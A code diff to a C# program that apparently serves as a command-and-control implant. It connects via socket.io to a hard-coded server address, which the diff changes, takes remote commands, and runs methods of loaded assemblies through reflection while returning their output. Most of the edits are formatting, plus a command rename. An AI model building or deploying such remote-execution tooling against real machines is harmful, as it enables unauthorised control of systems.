@@ -42,7 +42,7 @@ namespace ConsoleApp1
             }
             while (true) { };
         }
-        static async void Go(string home = "http://172.16.113.1:8888/")
+        static async void Go(string home = "http://192.168.1.12:8888/")
         {
             // create new socket.io client
             var client = new SocketIO(home);
@@ -120,12 +120,12 @@ namespace ConsoleApp1
             client.On("list-jobs", response =>
             {
                 jobs = jobs.Where(j => j.Thread.IsAlive).ToList();
-                
+
                 client.EmitAsync("echo", new
                 {
                     returnType = 0,
-                    output = jobs.Any() ? 
-                        String.Join("\n", jobs.Select(j => $"{j.Id}\t{j.Module}\t{j.Method}\t{((int)(DateTime.Now - j.StartTime).TotalSeconds).ToString()}s" ))
+                    output = jobs.Any() ?
+                        String.Join("\n", jobs.Select(j => $"{j.Id}\t{j.Module}\t{j.Method}\t{((int)(DateTime.Now - j.StartTime).TotalSeconds).ToString()}s"))
                         : "No active jobs"
                 });
             });
@@ -138,7 +138,7 @@ namespace ConsoleApp1
 
                     var job = jobs.FirstOrDefault(j => j.Id == searchId);
 
-                    if(job != null)
+                    if (job != null)
                     {
                         job.Thread.Abort();
                         jobs.Remove(job);
@@ -156,7 +156,7 @@ namespace ConsoleApp1
             });
 
             // Client invoke loaded assembly non-threaded
-            client.On("run-nothread", response =>
+            client.On("run-inline", response =>
             {
                 RunAndReturn(client, response);
             });
@@ -247,7 +247,7 @@ namespace ConsoleApp1
                         Console.SetOut(sw);
 
                         object instance = Activator.CreateInstance(type);
-                        methodOutput = method.Invoke(instance, 
+                        methodOutput = method.Invoke(instance,
                             callback is null ? new object[] { args } : new object[] { callback });
 
                         //Restore output -- Stops redirecting output
